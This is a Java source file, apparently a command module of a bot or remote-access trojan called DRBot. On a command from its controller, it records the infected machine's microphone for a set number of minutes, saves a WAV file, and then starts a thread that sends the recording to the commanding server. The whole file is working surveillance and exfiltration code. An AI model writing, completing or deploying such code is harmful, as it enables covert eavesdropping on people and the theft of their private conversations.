package com.DRBot.Commands;

import com.DRBot.SecureLine.SecureLine;
import java.io.PrintWriter;
import java.io.File;
import java.io.IOException;
import java.net.Inet4Address;
import java.util.Date;
import javax.sound.sampled.AudioFileFormat;
import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioInputStream;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.DataLine;
import javax.sound.sampled.LineUnavailableException;
import javax.sound.sampled.TargetDataLine;

/**
 *
 * @author MerNat
 */

public class recAudio {
    
    
    long RECORD_TIME;
    private Date date = new Date();
    private final String wavName = date.getDate()+"-"+(date.getMonth()+1)+"-"+(1900+date.getYear());
    final File wavFile = new File(wavName + ".wav");
    private final SecureLine secureLine;
    

    AudioFileFormat.Type fileType = AudioFileFormat.Type.WAVE;

    private TargetDataLine line;
    private final PrintWriter writer;
    private final Inet4Address inetServer;
    private final String botName;
    private int port;
    
    recAudio(String[] command,PrintWriter writer,Inet4Address inetServer,String botName,SecureLine secureLine){
    
    this.writer = writer;
    this.inetServer = inetServer;
    this.botName = botName;
    this.secureLine = secureLine;
    
    
    try{
        port = Integer.decode(command[1]).intValue();
        RECORD_TIME = (Long.decode(command[2]).longValue()) * 60 * 1000;
        }
    
        catch(Exception ioE){
            toPrint("[Audio Recorder] There is an error generated.");
        }
        
        Thread stopper = new Thread(new Runnable(){
           @Override
           public void run(){
               try {
                    Thread.sleep(RECORD_TIME);
		} 
               catch (InterruptedException ex) {}
               finish();
           }
        });
        stopper.start();
        toPrint("[Audio Recorder] Recording starts ...");
        start();
    
    }
  
    AudioFormat getAudioFormat() {
		float sampleRate = 16000;
		int sampleSizeInBits = 8;
		int channels = 2;
		boolean signed = true;
		boolean bigEndian = true;
		AudioFormat format = new AudioFormat(sampleRate, sampleSizeInBits,channels, signed, bigEndian);
		return format;
	}
    
    private void start() {
		try {
			AudioFormat format = getAudioFormat();
			DataLine.Info info = new DataLine.Info(TargetDataLine.class, format);

			// checks if system supports the data line
			if (!AudioSystem.isLineSupported(info)) {
				System.out.println("Line not supported");
				System.exit(0);
			}
			line = (TargetDataLine) AudioSystem.getLine(info);
			line.open(format);
			line.start();	// start capturing

			AudioInputStream ais = new AudioInputStream(line);

			// start recording
			AudioSystem.write(ais, fileType, wavFile);

		} catch (LineUnavailableException ex) {} 
                catch (IOException ioe) {}
	}
    
    private void finish() {
		line.stop();
		line.close();
		toPrint("[Audio Recorder] Recorder Shutdown.");
    Thread sendRec = new Thread(new get(port,inetServer,writer,botName,wavFile,secureLine));
    sendRec.start();
    
    }   
    private void toPrint(String toPrint){
                this.writer.println(toPrint);
                this.writer.flush();
    }
}
